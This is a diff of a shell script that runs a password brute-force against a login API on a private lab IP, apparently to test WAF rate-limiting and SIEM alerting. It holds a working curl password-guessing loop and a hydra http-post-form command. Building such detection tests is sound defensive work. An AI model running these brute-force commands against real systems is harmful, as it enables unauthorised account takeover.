@@ -5,16 +5,17 @@
 #   event_type=auth_failure / auth_login_attempts_total{result="failure"}.
 # Expected response: WAF rate-limit / block IP, SIEM alert. (Availability is
 #   not affected - this is a compromise-attempt scenario, not a DoS.)
-# Usage: TARGET=192.168.137.1 ./bruteforce.sh
-#   Env: TARGET, PORT, LOGIN_PATH, USERNAME, WORDLIST, FAIL_CODE
+# Usage: TARGET=172.16.147.10 ./bruteforce.sh
+#   Env: TARGET, PORT, LOGIN_PATH, LOGIN_USER (preferred), USERNAME (fallback), WORDLIST, FAIL_CODE
 #        MODE=json (default, matches FastAPI) | form (hydra, urlencoded)
+#   Note zsh: USERNAME est un paramètre réservé ; utiliser LOGIN_USER=... ou env USERNAME=...
 set -euo pipefail
 source "$(dirname "$0")/../_lib/guard.sh"
 
-TARGET="${TARGET:-192.168.137.1}"
+TARGET="${TARGET:-172.16.147.10}"
 PORT="${PORT:-8080}"
 LOGIN_PATH="${LOGIN_PATH:-/api/auth/login}"
-USERNAME="${USERNAME:-admin@resilience.local}"
+LOGIN_USER="${LOGIN_USER:-${USERNAME:-admin@resilience.local}}"
 WORDLIST="${WORDLIST:-$(dirname "$0")/wordlist-small.txt}"
 MODE="${MODE:-json}"
 USER_FIELD="${USER_FIELD:-email}"
@@ -32,7 +33,7 @@ fi
 OUTDIR="$(ra_logdir bruteforce)"
 exec > >(tee -a "$OUTDIR/bruteforce.log") 2>&1
 
-echo "[*] Target: http://$TARGET:$PORT$LOGIN_PATH user=$USERNAME mode=$MODE"
+echo "[*] Target: http://$TARGET:$PORT$LOGIN_PATH user=$LOGIN_USER mode=$MODE"
 echo "[*] Started: $(ra_now)   Wordlist: $WORDLIST ($(wc -l < "$WORDLIST") pw)   Logs: $OUTDIR"
 
 cleanup() { echo ""; echo "[*] Stopping... $(ra_now)"; pkill -f hydra || true; }
@@ -45,7 +46,7 @@ json_brute() {
     [ -z "$pw" ] && continue
     code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 \
       -H 'Content-Type: application/json' -X POST "$url" \
-      -d "{\"$USER_FIELD\":\"$USERNAME\",\"$PASS_FIELD\":\"$pw\"}" || echo 000)
+      -d "{\"$USER_FIELD\":\"$LOGIN_USER\",\"$PASS_FIELD\":\"$pw\"}" || echo 000)
     printf '    %-20s -> HTTP %s\n' "$pw" "$code"
     if [ "$code" = "200" ]; then hit="$pw"; echo "[+] Candidate success: $pw (HTTP 200)"; break; fi
     sleep 0.5
@@ -56,7 +57,7 @@ json_brute() {
 form_brute() {
   command -v hydra >/dev/null 2>&1 || { echo "[-] hydra not installed: sudo dnf install hydra"; return 1; }
   echo "[*] Form brute (hydra, t=4) - endpoint must accept urlencoded form..."
-  hydra -l "$USERNAME" -P "$WORDLIST" -t 4 -w 5 \
+  hydra -l "$LOGIN_USER" -P "$WORDLIST" -t 4 -w 5 \
     "$TARGET" http-post-form \
     "$LOGIN_PATH:$USER_FIELD=^USER^&$PASS_FIELD=^PASS^:F=$FAIL_CODE" -s "$PORT" || true
 }
